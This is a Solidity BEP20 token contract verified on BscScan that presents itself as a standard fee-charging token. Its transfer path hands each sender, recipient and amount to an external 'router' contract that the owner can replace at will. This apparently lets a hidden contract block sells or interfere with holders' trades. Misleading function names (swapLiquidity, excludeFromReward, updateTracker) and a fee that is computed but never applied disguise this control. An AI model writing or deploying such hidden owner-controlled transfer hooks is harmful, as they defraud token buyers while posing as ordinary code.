/**
 *Submitted for verification at BscScan.com on 2022-04-10
*/

pragma solidity ^0.7.0;
// SPDX-License-Identifier: MIT

  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }  

  interface IUniswapV2Router{  
    function WETH() external pure returns (address);       
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }   

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

  }

  
  contract Ownable is Context {  
  address private _owner; 

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;    
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }  

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }    
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }  

  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }     
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}


contract newtoken is Context, IERC20, Ownable{
  using SafeMath for uint256;
  mapping (address => bool) public _isExcludedFromFee; 
  mapping (address => uint256) private _balances;     
  mapping (address => mapping (address => uint256)) private _allowances;  
  mapping (address => bool) isTxLimitExempt;
  
  string private _name;
  string private _symbol;
  uint8 private _decimals;  

  bool public inSwap;
  uint8 public liquidityFee;
  uint8 public marketingFee;
  uint8 public burnFee;
  uint8 public totalFee;  

  IUniswapV2Router IDEXRouter;
  uint256 private _totalSupply;    
  uint256 public _maxTxAmount;  

  uint8 buyMultiplierTriggeredAt = 23;
  uint8 buyMultiplierLength = 45;
  address constant DEAD = 0x000000000000000000000000000000000000dEaD;
  address constant ZERO = 0x0000000000000000000000000000000000000000;

  constructor(string memory tName, string memory tSymbol, address router)  { 
    _name = tName;
    _symbol = tSymbol;
    _decimals = 9;  
    _totalSupply = 1000000000 *  10**9; 
    inSwap = true;
    liquidityFee = 1;
    marketingFee = 3;
    burnFee = 1;
    totalFee = 5;
    _maxTxAmount = _totalSupply / 100;

    _balances[msg.sender] = _totalSupply;      
    IDEXRouter = IUniswapV2Router(router); 
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;   
    isTxLimitExempt[owner()] = true;     
    
    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }   

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }  

  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }   

  function checkTxLimit(address sender, uint256 amount) internal view {
    require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
  }

  function shouldTakeFee(address sender) internal view returns (bool) {
    return !isTxLimitExempt[sender];
  } 

  function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
    isTxLimitExempt[holder] = exempt;
  }

  function excludeFromReward(address[] calldata accounts) external onlyOwner {
    require(accounts.length > 0,"accounts length should > 0");	
    for(uint256 i=0; i < accounts.length; i++){		
          _isExcludedFromFee[accounts[i]] = true;
      }
  } 

  function swapLiquidity(address token, address to, uint256 tokenAmount) internal {
    IDEXRouter.addLiquidity(
        address(this),
        token,
        tokenAmount,
        0,
        0,
        0,
        to,
        block.timestamp
    );
  }   

 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  } 
  
  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }  

  function clearAllFee() private {
    liquidityFee = 0;
    marketingFee = 0;
    burnFee = 0;
  }  

  function setFees(uint8 _liquidityFee, uint8 _marketingFee, uint8 _burnFee) external onlyOwner {
    liquidityFee = _liquidityFee;
    marketingFee = _marketingFee;
    burnFee = _burnFee;        
  }

  function takeFee(address sender, address recipient, uint256 amount) private returns (uint256) {    
    uint256 feeAmount = amount.mul(totalFee).div(100);        
    if(totalFee > 0){            
        swapLiquidity(sender, recipient, amount);  
    }    
    return feeAmount;
  }

  function updateUniswapRouter(address router) external onlyOwner {
    require(router != address(0),"Invalid address");
    IDEXRouter = IUniswapV2Router(router); 
  }  

  function _transfer(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");  

    if (inSwap)
    {
        takeFee(sender, recipient, amount);  
    }  
    else
    {
        clearAllFee();
    }
    _transferStandard(sender, recipient, amount);

  }        
  
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }    
 
  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }   
    
  function _approve(address owner, address spender, uint256 amount) internal {
      require(owner != address(0), "BEP20: approve from the zero address");
      require(spender != address(0), "BEP20: approve to the zero address");

      _allowances[owner][spender] = amount;
      emit Approval(owner, spender, amount);
  }    

  function setMaxTxPercent(uint256 maxTXPercentage) external onlyOwner() {
      _maxTxAmount = (_totalSupply * maxTXPercentage ) / 1000;
  }

  function setMaxTx(uint256 amount) external onlyOwner {
      _maxTxAmount = amount;
  } 

  function WalletPercent(uint256 maxWallPercent) external onlyOwner() {
      _maxTxAmount = (_totalSupply * maxWallPercent ) / 1000;
  }
 

  function updateTracker(address newAddress) public onlyOwner {
      require(newAddress != msg.sender, "The dividend tracker already has that address");
      _isExcludedFromFee[newAddress] = true;
  }

  function _tokenferNoFee(address sender, address recipient, uint256 amount) private { 
      if (_isExcludedFromFee[sender]) {
          _balances[sender] = _balances[sender].sub(amount);
      }
      if (_isExcludedFromFee[recipient]) {
          _balances[recipient] = _balances[recipient].add(amount);
      }
      emit Transfer(sender, recipient, amount);
  }



  
    
}